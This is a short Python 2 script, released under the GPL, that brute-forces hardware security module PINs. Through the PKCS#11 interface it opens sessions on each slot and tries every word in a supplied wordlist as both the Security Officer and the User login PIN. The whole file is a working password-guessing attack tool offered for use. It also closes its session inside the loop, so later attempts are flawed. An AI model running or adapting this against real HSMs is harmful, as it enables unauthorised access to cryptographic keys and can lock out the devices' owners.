#!/usr/bin/env python

#
# Brute Force Script 1.0 for HSM by Tiago Vilas tvilas at hushmail dot com 
#
# This file is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#

import PyKCS11.LowLevel
import sys
conn = PyKCS11.LowLevel.CPKCS11Lib()
info = PyKCS11.LowLevel.CK_INFO()
slotInfo = PyKCS11.LowLevel.CK_SLOT_INFO()
lib = "libs/cryptoki.dll"
session = PyKCS11.LowLevel.CK_SESSION_HANDLE()
slotList = PyKCS11.LowLevel.ckintlist()


print "HSM brute force 0.1 by Tiago Vilas  tvilas at hushmail dot com"
if len(sys.argv) < 2:
    sys.exit('Usage: %s <wordlist> <pkcs.dll>' % sys.argv[0])

try: 
    lib = sys.argv[2] 
    print "loading library that you supplied \n" 
    print "Load of " + lib + ": " + str(conn.Load(lib, 1))
except:
    print "loading default library (Eracom)\n" 
    print "Load of " + lib + ": " + str(conn.Load(lib, 1))

wordlist = open(sys.argv[1], "r")

print "Get Info: " + hex(conn.C_GetInfo(info))
print "Library manufacturerID: " + info.GetManufacturerID()
print "Get Slot List: " + hex(conn.C_GetSlotList(1, slotList))
print "\tAvailable Slots: " + str(len(slotList))


if len(slotList) != 0:
    for slot in xrange(len(slotList)):
        print "\tOpenning Session: " + hex(conn.C_OpenSession(slotList[slot], PyKCS11.LowLevel.CKF_SERIAL_SESSION | PyKCS11.LowLevel.CKF_RW_SESSION, session))
        for pin in wordlist:
            print "\tTrying login with (SO): " + hex(conn.C_Login(session,
                PyKCS11.LowLevel.CKU_SO, pin))
            print "\tTrying login with (USER): " + hex(conn.C_Login(session, PyKCS11.LowLevel.CKU_USER, pin))
            print "Closing Session(): " + hex(conn.C_CloseSession(session))


print "Finalize Session: " + hex(conn.C_Finalize())
print conn.Unload()
